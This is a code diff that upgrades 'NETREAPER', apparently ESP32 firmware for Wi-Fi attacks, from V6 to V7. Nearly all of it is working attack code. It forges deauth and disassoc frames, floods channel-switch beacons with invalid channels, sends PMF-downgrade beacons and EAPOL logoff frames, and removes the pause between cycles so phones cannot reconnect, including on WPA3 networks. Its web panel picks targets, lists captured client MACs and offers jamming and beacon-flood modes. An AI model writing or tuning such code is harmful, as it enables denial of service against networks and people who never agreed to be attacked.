@@ -217,10 +217,10 @@ void startDeauth(int index){
   esp_wifi_set_promiscuous_rx_cb(snifferCallback);
   seqNum=0;capturedClientCount=0;
   digitalWrite(deauthLedPin,HIGH);isDeauthing=true;
-  Serial.printf("[*] V6 DEAUTH: '%s' Ch:%d Enc:%s PMF:%s\n",targetSSID.c_str(),targetChannel,getEncName(targetEncType).c_str(),targetPMFRequired?"REQ(fast-CSA)":"opt(full)");
+  Serial.printf("[*] V7 DEAUTH: '%s' Ch:%d Enc:%s PMF:%s\n",targetSSID.c_str(),targetChannel,getEncName(targetEncType).c_str(),targetPMFRequired?"REQ(continuous-CSA)":"opt(full)");
 }
 
-// ===== PMF DOWNGRADE BEACON (fast: 3 @ 20ms) =====
+// ===== PMF DOWNGRADE BEACON (3 @ 20ms) =====
 void sendPMFDowngradeBeacon(){
   uint8_t pkt[128];
   pkt[0]=0x80;pkt[1]=0;pkt[2]=0;pkt[3]=0;
@@ -250,7 +250,7 @@ void sendPMFDowngradeBeacon(){
   }
 }
 
-// ===== CSA BEACON FLOOD (V6: 15 broadcast @ 30ms + unicast per client, switchCount=0) =====
+// ===== CSA BEACON FLOOD (10 broadcast + unicast per client, switchCount=0) =====
 void sendCSABeaconFlood(){
   uint8_t pkt[80];
   pkt[0]=0x80;pkt[1]=0x00;
@@ -270,8 +270,8 @@ void sendCSABeaconFlood(){
   int csaIdx=o;
   pkt[o++]=14;
   pkt[o++]=0;
-  uint8_t invalidChannels[]={14,1,14,12,13,1,14,1,12,13,14,1,13,12,1};
-  for(int i=0;i<15;i++){
+  uint8_t invalidChannels[]={14,1,14,12,13,1,14,1,12,13};
+  for(int i=0;i<10;i++){
     pkt[csaIdx]=invalidChannels[i];
     pkt[csaIdx+1]=0;
     uint64_t ts2=esp_timer_get_time();
@@ -300,7 +300,7 @@ void sendCSABeaconFlood(){
   }
 }
 
-// ===== CSA ACTION ATTACK (fast: 2 @ 30ms) =====
+// ===== CSA ACTION ATTACK (2 @ 30ms) =====
 void sendCSAActionAttack(){
   const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
   uint8_t ic[]={255,14,100,165,200,0,13,12};
@@ -332,7 +332,7 @@ void sendCSAActionAttack(){
   }
 }
 
-// ===== EAPOL LOGOFF (fast: 2 @ 20ms per client) =====
+// ===== EAPOL LOGOFF (2 @ 20ms per client) =====
 void sendEAPOLLogoff(){
   const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
   uint8_t e[38];
@@ -353,7 +353,7 @@ void sendEAPOLLogoff(){
   }
 }
 
-// ===== V6 POWERFUL DEAUTH (FAST CYCLE ~4s) =====
+// ===== V7 POWERFUL DEAUTH (CONTINUOUS CSA PRESSURE) =====
 void sendPowerfulDeauth(){
   uint8_t curCh=0;
   wifi_second_chan_t sc2;
@@ -367,9 +367,13 @@ void sendPowerfulDeauth(){
   uint8_t reasons[]={1,2,4,5,6,7};
   int nr=6;
 
+  // Phase 1: PMF degrade
   sendPMFDowngradeBeacon();
+
+  // Phase 2: CSA Beacon Flood #1 (initial)
   sendCSABeaconFlood();
 
+  // Phase 3: per-client deauth + disassoc
   if(capturedClientCount>0){
     for(int c=0;c<capturedClientCount&&c<20;c++){
       uint8_t* clientMac=capturedClients[c];
@@ -403,7 +407,8 @@ void sendPowerfulDeauth(){
     }
   }
 
-  for(int i=0;i<6;i++){
+  // Phase 4: Broadcast deauth (4 @ 50ms)
+  for(int i=0;i<4;i++){
     uint8_t d[26];
     d[0]=0xC0;d[1]=0;d[2]=0x3A;d[3]=1;
     memcpy(&d[4],bc,6);
@@ -415,13 +420,19 @@ void sendPowerfulDeauth(){
     seqNum=(seqNum+1)&0x0FFF;
     esp_wifi_80211_tx(WIFI_IF_AP,d,26,false);
     esp_wifi_80211_tx(WIFI_IF_STA,d,26,false);
-    delay(80);
+    delay(50);
   }
 
+  // Phase 5: CSA Action attack
   sendCSAActionAttack();
+
+  // Phase 6: EAPOL Logoff per client
   if(capturedClientCount>0) sendEAPOLLogoff();
-  sendPMFDowngradeBeacon();
-  delay(200);
+
+  // Phase 7: CSA Beacon Flood #2 (final — prevents mobile reconnect)
+  sendCSABeaconFlood();
+
+  // Phase 8: NO pause — go directly to next cycle
 }
 
 void stopDeauth(){
@@ -505,23 +516,23 @@ void handleRoot(){
   String st="SYSTEM IDLE",sc="#00ff00",sd="";
   if(isJamming){st="MAX POWER RF JAMMING";sc="#ffaa00";sd="<p style='color:#fff;'>GPIO 4 to stop.</p>";}
   else if(isDeauthing){
-    st="V6 DEAUTH (FAST CYCLE)";sc="#ff0000";
+    st="V7 DEAUTH (CONTINUOUS CSA)";sc="#ff0000";
     char b[18];sprintf(b,"%02X:%02X:%02X:%02X:%02X:%02X",targetBSSID[0],targetBSSID[1],targetBSSID[2],targetBSSID[3],targetBSSID[4],targetBSSID[5]);
     sd="<div style='background:#220000;padding:15px;border-radius:8px;border:1px solid #ff0000;text-align:left;'>";
     sd+="<p style='color:#fff;font-size:16px;'>Target: <b style='color:#ff5555;'>"+targetSSID+"</b></p>";
     sd+="<p style='color:#aaa;font-size:13px;'>BSSID: "+String(b)+" | Ch: "+String(targetChannel)+" | Enc: "+getEncName(targetEncType)+"</p>";
     if(targetPMFRequired){
-      sd+="<p style='color:#ff5555;font-size:13px;font-weight:bold;'>⚠ PMF REQUIRED (WPA3) — CSA Beacon flood is primary (switchCount=0 = immediate).</p>";
+      sd+="<p style='color:#ff5555;font-size:13px;font-weight:bold;'>⚠ PMF REQUIRED (WPA3) — CSA Beacon flood is primary (runs 2x per cycle).</p>";
     } else {
-      sd+="<p style='color:#0f0;font-size:13px;'>PMF optional — All vectors active.</p>";
+      sd+="<p style='color:#0f0;font-size:13px;'>PMF optional — All vectors active. CSA runs 2x per cycle.</p>";
     }
     sd+="<p style='color:#ffaa00;font-size:14px;'>Captured Clients ("+String(capturedClientCount)+"):</p>";
     sd+="<div style='background:#110000;padding:8px;border-radius:5px;font-size:12px;color:#ff3333;max-height:120px;overflow-y:auto;'>";
     if(capturedClientCount==0){sd+="<i style='color:#666;'>Sniffing for devices... (broadcast deauth catches MAC-randomized)</i>";}
     else{for(int i=0;i<capturedClientCount;i++){char cm[18];sprintf(cm,"%02X:%02X:%02X:%02X:%02X:%02X",capturedClients[i][0],capturedClients[i][1],capturedClients[i][2],capturedClients[i][3],capturedClients[i][4],capturedClients[i][5]);String v=getVendorName(capturedClients[i]);sd+="&#9888; <b>["+v+"]</b> "+String(cm)+"<br>";}}
     sd+="</div>";
-    sd+="<p style='color:#00ffff;font-size:11px;margin-top:8px;'>V6: CSA BEACON (15+unicast, switchCount=0) + Fast deauth (10+10 @ 30ms) + Broadcast (6 @ 80ms) + CSA Action + EAPOL + PMF</p>";
-    sd+="<p style='color:#888;font-size:10px;'>Cycle: ~4s. Persistent. 2x faster than V4.</p>";
+    sd+="<p style='color:#00ffff;font-size:11px;margin-top:8px;'>V7: PMF + CSA×2 (start+end) + Fast deauth (10+10 @ 30ms) + Broadcast (4 @ 50ms) + CSA Action + EAPOL — NO cycle pause</p>";
+    sd+="<p style='color:#888;font-size:10px;'>Cycle: ~4s. CSA at both ends prevents mobile reconnect.</p>";
     sd+="</div>";
   }
   else if(isBeaconing){st="BEACON FLOOD";sc="#00ffff";sd="<p style='color:#fff;'>Flooding rajdeep_XXXX.</p>";}
@@ -536,7 +547,7 @@ void handleRoot(){
   h+=".bs{background:#330000;border-color:#ff3333;color:#ff3333;}";
   h+="table{width:100%;border-collapse:collapse;margin-top:10px;}th,td{border:1px solid #333;padding:8px;}th{color:#00ff00;}td{color:#ccc;}";
   h+="</style></head><body>";
-  h+="<h1>NETREAPER V6</h1><div class='sb'><div class='st'>"+st+"</div>"+sd+"</div>";
+  h+="<h1>NETREAPER V7</h1><div class='sb'><div class='st'>"+st+"</div>"+sd+"</div>";
   h+="<a href='/scan' class='bf'>SCAN NETWORKS</a>";
   if(isDeauthing)h+="<a href='/deauth?idx=stop' class='bf bs'>STOP DEAUTH</a>";
   if(isBeaconing)h+="<a href='/beacon?action=stop' class='bf bs'>STOP BEACON</a>";
@@ -600,7 +611,7 @@ void setup(){
   server.on("/",handleRoot);server.on("/scan",handleScan);server.on("/deauth",handleDeauth);
   server.on("/beacon",handleBeacon);server.on("/rf",handleRFToggle);
   server.begin();
-  Serial.println("[*] V6 Ready — Fast cycle (~4s) + switchCount=0 + unicast CSA");
+  Serial.println("[*] V7 Ready — Continuous CSA pressure (2x per cycle, no pause)");
 }
 
 void loop(){
